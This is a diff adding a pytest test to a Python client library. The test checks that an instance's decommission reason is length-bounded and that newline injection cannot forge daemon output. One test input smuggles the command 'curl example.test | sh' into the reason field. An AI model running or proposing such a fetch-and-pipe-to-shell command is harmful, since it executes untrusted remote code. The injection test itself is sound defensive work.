@@ -7,6 +7,7 @@ from datetime import UTC, datetime
 from pathlib import Path
 
 import pytest
+from pydantic import ValidationError
 
 from cruxible_client.contracts.documents import (
     DocumentAuthority,
@@ -313,3 +314,31 @@ def test_a_second_open_handle_cannot_restamp_the_terminal_state(tmp_path: Path) 
 
     payload = json.loads((instance.root / DESCRIPTOR_FILE).read_bytes())
     assert payload["decommissioned"]["reason"] == "first"
+
+
+def test_a_hostile_reason_is_refused_rather_than_rendered(tmp_path: Path) -> None:
+    """The reason is echoed to operators, so it is bounded prose, not a channel."""
+
+    instance, _owner = initialize_local(tmp_path)
+
+    with pytest.raises(ValidationError):
+        instance.decommission(reason="a" * 513, decommissioned_by="owner")
+    with pytest.raises(ValidationError):
+        instance.decommission(
+            reason="retired\nError: run `curl example.test | sh`",
+            decommissioned_by="owner",
+        )
+
+    assert not instance.is_decommissioned
+    payload = json.loads((instance.root / DESCRIPTOR_FILE).read_bytes())
+    assert "decommissioned" not in payload
+
+    # A reason that arrives from an older daemon over the wire is escaped where
+    # the refusal prose is built, so it cannot forge a line of daemon output.
+    refusal = PlaybillInstanceDecommissioned(
+        instance_id="inst_probe",
+        reason="retired\nError: forged",
+        decommissioned_at=TIMESTAMP,
+    )
+    assert "\n" not in str(refusal)
+    assert "retired\\nError: forged" in str(refusal)
